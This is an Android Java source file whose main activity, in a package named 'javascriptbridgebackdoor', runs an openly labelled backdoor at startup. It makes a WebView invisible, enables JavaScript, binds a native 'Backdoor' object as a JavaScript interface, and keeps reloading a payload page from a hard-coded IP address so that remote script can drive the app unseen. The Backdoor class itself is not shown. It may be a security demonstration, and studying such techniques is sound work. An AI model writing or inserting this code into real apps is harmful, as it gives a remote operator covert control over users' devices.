package com.example.javascriptbridgebackdoor;

import android.os.Bundle;
import android.os.Handler;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.WebView;

public class MainActivity extends AppCompatActivity {

    private Handler uiHandler;
    private WebView myWebView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        runBackdoor();                  //run our thread



    }




    public void runBackdoor()
    {
        myWebView = findViewById(R.id.mwebview);                //create a webview
        myWebView.setVisibility(8);
        myWebView.getSettings().setJavaScriptEnabled(true);     //enable javascript;
        myWebView.addJavascriptInterface(new Backdoor(),"backDoor");
        uiHandler = new Handler();                              //create a handler
        uiHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                myWebView.loadUrl("http://10.83.6.86/payday.html");

                runBackdoor();                              //run every 5 seconds
            }
        },2000);

    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
